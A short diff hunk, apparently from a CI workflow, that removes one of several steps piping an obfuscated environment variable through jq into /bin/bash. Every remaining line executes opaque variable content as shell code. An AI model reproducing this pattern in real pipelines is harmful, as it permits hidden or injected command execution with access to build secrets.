@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$afn6" | jq -r .ox7 | /bin/bash
           printf '%s' "$l17542" | jq -r .f701 | /bin/bash
-          echo $uc02802 | jq -r .o2 | /bin/bash
           printf '%s' "$kmxnz4812" | jq -r .ndt626 | /bin/bash
           echo $uhha6 | jq -r .hd07 | /bin/bash
 
